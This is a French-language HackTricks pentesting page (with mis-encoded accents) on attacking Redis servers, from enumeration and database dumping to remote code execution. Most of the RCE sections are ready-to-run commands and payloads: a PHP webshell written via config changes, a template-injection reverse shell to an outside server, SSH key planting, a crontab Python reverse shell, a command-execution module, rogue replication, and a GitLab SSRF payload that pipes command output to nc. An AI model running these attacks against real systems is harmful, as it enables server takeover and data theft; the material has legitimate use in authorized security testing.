# 6379 - Pentesting Redis

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## Informations de base

D'apr√®s [la documentation](https://redis.io/topics/introduction) : Redis est un **magasin de structures de donn√©es** open source (licence BSD), en m√©moire, utilis√© comme **base de donn√©es**, cache et courtier de messages.

Par d√©faut, Redis utilise un protocole bas√© sur du texte brut, mais vous devez garder √† l'esprit qu'il peut √©galement impl√©menter **ssl/tls**. Apprenez √† [ex√©cuter Redis avec ssl/tls ici](https://fossies.org/linux/redis/TLS.md).

**Port par d√©faut :** 6379
```
PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```
## Enumeration automatique

Certains outils automatis√©s qui peuvent aider √† obtenir des informations d'une instance redis :
```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```
## Manual Enumeration

### Banner

Redis est un **protocole bas√© sur du texte**, vous pouvez simplement **envoyer la commande dans un socket** et les valeurs retourn√©es seront lisibles. N'oubliez pas que Redis peut fonctionner en utilisant **ssl/tls** (mais c'est tr√®s √©trange).

Dans une instance Redis r√©guli√®re, vous pouvez simplement vous connecter en utilisant `nc` ou vous pouvez √©galement utiliser `redis-cli`:
```bash
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```
La **premi√®re commande** que vous pourriez essayer est **`info`**. Elle **peut renvoyer une sortie avec des informations** sur l'instance Redis **ou quelque chose** comme ce qui suit est renvoy√© :
```
-NOAUTH Authentication required.
```
Dans ce dernier cas, cela signifie que **vous avez besoin de credentials valides** pour acc√©der √† l'instance Redis.

### Authentification Redis

**Par d√©faut**, Redis peut √™tre accessible **sans credentials**. Cependant, il peut √™tre **configur√©** pour ne prendre en charge **que le mot de passe, ou le nom d'utilisateur + mot de passe**.\
Il est possible de **d√©finir un mot de passe** dans le fichier _**redis.conf**_ avec le param√®tre `requirepass` **ou temporairement** jusqu'√† ce que le service red√©marre en se connectant et en ex√©cutant : `config set requirepass p@ss$12E45`.\
De plus, un **nom d'utilisateur** peut √™tre configur√© dans le param√®tre `masteruser` √† l'int√©rieur du fichier _**redis.conf**_.

{% hint style="info" %}
Si seul le mot de passe est configur√©, le nom d'utilisateur utilis√© est "**default**".\
De plus, notez qu'il n'y a **aucun moyen de trouver de mani√®re externe** si Redis a √©t√© configur√© avec seulement un mot de passe ou un nom d'utilisateur + mot de passe.
{% endhint %}

Dans des cas comme celui-ci, vous devrez **trouver des credentials valides** pour interagir avec Redis, donc vous pourriez essayer de [**brute-force**](../generic-methodologies-and-resources/brute-force.md#redis) cela.\
**Dans le cas o√π vous avez trouv√© des credentials valides, vous devez authentifier la session** apr√®s avoir √©tabli la connexion avec la commande :
```bash
AUTH <username> <password>
```
**Des identifiants valides** seront r√©pondus par : `+OK`

### **√ânum√©ration authentifi√©e**

Si le serveur Redis permet des **connexions anonymes** ou si vous avez obtenu des identifiants valides, vous pouvez initier le processus d'√©num√©ration pour le service en utilisant les **commandes** suivantes :
```bash
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```
**D'autres commandes Redis** [**peuvent √™tre trouv√©es ici**](https://redis.io/topics/data-types-intro) **et** [**ici**](https://lzone.de/cheat-sheet/Redis)**.**

Notez que les **commandes Redis d'une instance peuvent √™tre renomm√©es** ou supprim√©es dans le fichier _redis.conf_. Par exemple, cette ligne supprimera la commande FLUSHDB :
```
rename-command FLUSHDB ""
```
Plus d'informations sur la configuration s√©curis√©e d'un service Redis ici : [https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)

Vous pouvez √©galement **surveiller en temps r√©el les commandes Redis** ex√©cut√©es avec la commande **`monitor`** ou obtenir les **25 requ√™tes les plus lentes** avec **`slowlog get 25`**

Trouvez plus d'informations int√©ressantes sur d'autres commandes Redis ici : [https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)

### **Dumping Database**

√Ä l'int√©rieur de Redis, les **bases de donn√©es sont des num√©ros commen√ßant √† 0**. Vous pouvez v√©rifier si l'une d'elles est utilis√©e dans la sortie de la commande `info` dans le bloc "Keyspace" :

![](<../.gitbook/assets/image (766).png>)

Ou vous pouvez simplement obtenir tous les **keyspaces** (bases de donn√©es) avec :
```
INFO keyspace
```
Dans cet exemple, les **bases de donn√©es 0 et 1** sont utilis√©es. **La base de donn√©es 0 contient 4 cl√©s et la base de donn√©es 1 en contient 1**. Par d√©faut, Redis utilisera la base de donn√©es 0. Pour effectuer un dump de la base de donn√©es 1, vous devez faire :
```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS *
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```
En cas d'erreur suivante `-WRONGTYPE Operation against a key holding the wrong kind of value` lors de l'ex√©cution de `GET <KEY>`, c'est parce que la cl√© peut √™tre autre chose qu'une cha√Æne ou un entier et n√©cessite un op√©rateur sp√©cial pour l'afficher.

Pour conna√Ætre le type de la cl√©, utilisez la commande `TYPE`, exemple ci-dessous pour les cl√©s de liste et de hachage.
```bash
TYPE <KEY>
[ ... Type of the Key ... ]
LRANGE <KEY> 0 -1
[ ... Get list items ... ]
HGET <KEY> <FIELD>
[ ... Get hash item ... ]

# If the type used is weird you can always do:
DUMP <key>
```
**Dump the database with npm**[ **redis-dump**](https://www.npmjs.com/package/redis-dump) **or python** [**redis-utils**](https://pypi.org/project/redis-utils/)

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de bugs !

**Hacking Insights**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du hacking

**Real-Time Hack News**\
Restez √† jour avec le monde du hacking en rapide √©volution gr√¢ce √† des nouvelles et des insights en temps r√©el

**Latest Announcements**\
Restez inform√© des nouvelles chasses aux bugs lanc√©es et des mises √† jour cruciales des plateformes

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

## Redis RCE

### Interactive Shell

[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server) peut automatiquement obtenir un shell interactif ou un shell invers√© dans Redis(<=5.0.5).
```
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>
```
### PHP Webshell

Info de [**ici**](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html). Vous devez conna√Ætre le **chemin** du **dossier du site Web** :
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
‚ÄãSi l'exception d'acc√®s au webshell se produit, vous pouvez vider la base de donn√©es apr√®s sauvegarde et r√©essayer, n'oubliez pas de restaurer la base de donn√©es.

### Template Webshell

Comme dans la section pr√©c√©dente, vous pouvez √©galement √©craser un fichier de mod√®le html qui va √™tre interpr√©t√© par un moteur de template et obtenir un shell.

Par exemple, suivant [**ce rapport**](https://www.neteye-blog.com/2022/05/cyber-apocalypse-ctf-2022-red-island-writeup/), vous pouvez voir que l'attaquant a inject√© un **rev shell dans un html** interpr√©t√© par le **moteur de template nunjucks :**
```javascript
{{ ({}).constructor.constructor(
"var net = global.process.mainModule.require('net'),
cp = global.process.mainModule.require('child_process'),
sh = cp.spawn('sh', []);
var client = new net.Socket();
client.connect(1234, 'my-server.com', function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});"
)()}}
```
{% hint style="warning" %}
Notez que **plusieurs moteurs de template mettent en cache** les templates en **m√©moire**, donc m√™me si vous les √©crasez, le nouveau **ne sera pas ex√©cut√©**. Dans ces cas, soit le d√©veloppeur a laiss√© le rechargement automatique actif, soit vous devez effectuer un DoS sur le service (et vous attendre √† ce qu'il soit relanc√© automatiquement).
{% endhint %}

### SSH

Exemple [d'ici](https://blog.adithyanak.com/oscp-preparation-guide/enumeration)

Veuillez noter que le r√©sultat de **`config get dir`** peut √™tre modifi√© apr√®s d'autres commandes d'exploitation manuelles. Il est conseill√© de l'ex√©cuter en premier juste apr√®s la connexion √† Redis. Dans la sortie de **`config get dir`**, vous pourriez trouver le **dossier** de l'**utilisateur redis** (g√©n√©ralement _/var/lib/redis_ ou _/home/redis/.ssh_), et en sachant cela, vous savez o√π vous pouvez √©crire le fichier `authenticated_users` pour acc√©der via ssh **avec l'utilisateur redis**. Si vous connaissez le dossier d'un autre utilisateur valide o√π vous avez des permissions d'√©criture, vous pouvez √©galement en abuser :

1. G√©n√©rez une paire de cl√©s ssh publique-priv√©e sur votre pc : **`ssh-keygen -t rsa`**
2. √âcrivez la cl√© publique dans un fichier : **`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`**
3. Importez le fichier dans redis : **`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`**
4.  Enregistrez la cl√© publique dans le fichier **authorized\_keys** sur le serveur redis :

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```
5. Enfin, vous pouvez **ssh** au **serveur redis** avec la cl√© priv√©e : **ssh -i id\_rsa redis@10.85.0.52**

**Cette technique est automatis√©e ici :** [https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)

### Crontab
```
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```
L'exemple final est pour Ubuntu, pour **Centos**, la commande ci-dessus devrait √™tre : `redis-cli -h 10.85.0.52 config set dir /var/spool/cron/`

Cette m√©thode peut √©galement √™tre utilis√©e pour gagner des bitcoins : [yam](https://www.v2ex.com/t/286981#reply14)

### Charger le module Redis

1. En suivant les instructions de [https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand), vous pouvez **compiler un module redis pour ex√©cuter des commandes arbitraires**.
2. Ensuite, vous avez besoin d'un moyen pour **t√©l√©charger le module compil√©**.
3. **Chargez le module t√©l√©charg√©** √† l'ex√©cution avec `MODULE LOAD /path/to/mymodule.so`.
4. **Listez les modules charg√©s** pour v√©rifier qu'il a √©t√© correctement charg√© : `MODULE LIST`.
5. **Ex√©cutez** **des commandes** :

```
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```
6. D√©chargez le module quand vous le souhaitez : `MODULE UNLOAD mymodule`.

### Contournement du bac √† sable LUA

[**Ici**](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html), vous pouvez voir que Redis utilise la commande **EVAL** pour ex√©cuter **du code Lua en bac √† sable**. Dans le post li√©, vous pouvez voir **comment en abuser** en utilisant la fonction **dofile**, mais [apparemment](https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval), cela n'est plus possible. Quoi qu'il en soit, si vous pouvez **contourner le bac √† sable Lua**, vous pourriez **ex√©cuter des commandes arbitraires** sur le syst√®me. De plus, dans le m√™me post, vous pouvez voir quelques **options pour provoquer un DoS**.

Quelques **CVE pour √©chapper √† LUA** :

* [https://github.com/aodsec/CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

### Module Ma√Ætre-Esclave

Le ma√Ætre redis synchronise automatiquement toutes les op√©rations avec l'esclave redis, ce qui signifie que nous pouvons consid√©rer la vuln√©rabilit√© redis comme un esclave redis, connect√© au ma√Ætre redis que nous contr√¥lons, puis nous pouvons entrer la commande dans notre propre redis.
```
master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
```
## SSRF parlant √† Redis

Si vous pouvez envoyer une requ√™te **en texte clair** **√† Redis**, vous pouvez **communiquer avec lui** car Redis lira ligne par ligne la requ√™te et r√©pondra simplement par des erreurs aux lignes qu'il ne comprend pas :
```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
```
Donc, si vous trouvez une **vuln√©rabilit√© SSRF** sur un site web et que vous pouvez **contr√¥ler** certains **en-t√™tes** (peut-√™tre avec une vuln√©rabilit√© CRLF) ou des **param√®tres POST**, vous serez en mesure d'envoyer des commandes arbitraires √† Redis.

### Exemple : Gitlab SSRF + CRLF vers Shell

Dans **Gitlab11.4.7**, une vuln√©rabilit√© **SSRF** et une vuln√©rabilit√© **CRLF** ont √©t√© d√©couvertes. La vuln√©rabilit√© **SSRF** se trouvait dans la **fonctionnalit√© d'importation de projet √† partir d'URL** lors de la cr√©ation d'un nouveau projet et permettait d'acc√©der √† des IPs arbitraires sous la forme \[0:0:0:0:0:ffff:127.0.0.1] (cela acc√©dera √† 127.0.0.1), et la vuln√©rabilit√© **CRLF** a √©t√© exploit√©e en **ajoutant des caract√®res %0D%0A** √† l'**URL**.

Par cons√©quent, il √©tait possible de **profiter de ces vuln√©rabilit√©s pour communiquer avec l'instance Redis** qui **g√®re les files d'attente** de **gitlab** et d'abuser de ces files d'attente pour **obtenir une ex√©cution de code**. Le payload d'abus de la file d'attente Redis est :
```
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
```
Et la requ√™te **URL encode** **abusant de SSRF** et **CRLF** pour ex√©cuter un `whoami` et renvoyer la sortie via `nc` est :
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
_Pour une raison quelconque (comme pour l'auteur de_ [_https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/_](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/) _d'o√π proviennent ces informations), l'exploitation a fonctionn√© avec le sch√©ma `git` et non avec le sch√©ma `http`._

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de bugs !

**Aper√ßus de Hacking**\
Engagez-vous avec du contenu qui plonge dans le frisson et les d√©fis du hacking

**Actualit√©s de Hacking en Temps R√©el**\
Restez √† jour avec le monde du hacking en rapide √©volution gr√¢ce √† des nouvelles et des aper√ßus en temps r√©el

**Derni√®res Annonces**\
Restez inform√© des nouveaux programmes de bug bounty lanc√©s et des mises √† jour cruciales des plateformes

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
